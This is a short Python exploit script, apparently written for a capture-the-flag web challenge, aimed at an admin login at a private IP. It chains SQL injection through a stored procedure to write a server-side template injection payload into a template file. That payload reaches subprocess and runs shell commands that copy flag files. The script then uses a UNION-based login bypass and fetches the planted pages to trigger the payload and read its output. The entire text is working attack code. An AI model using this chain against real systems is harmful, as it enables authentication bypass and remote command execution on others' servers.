import requests

target = '192.168.23.130:5000'

s = requests.Session()
h = {'Content-Type': 'application/x-www-form-urlencoded'}

s.post('http://%s/admin/login/' % target, data=r"""username='%3bexec+sp_logEvent+"{{''.__class__.mro()[2].__subclasses__()[231]('type+..\..\\flag*+>+templates/sb-admin/pages/res.html',shell=True)}}",+'../server//////////////////////////////''',+',"../templates/sb-admin/pages/x.html"--+'%3b+--+&password=asd""", headers=h)

[s.post('http://%s/admin/login/' % target, data="username='+union+select+0,'root','7815696ecbf1c96e6894b779456d330e'+--+&password=asd", headers=h) for _ in xrange(10)]

s.get('http://%s/admin/?page=x' % target)
print s.get('http://%s/admin/?page=res' % target).text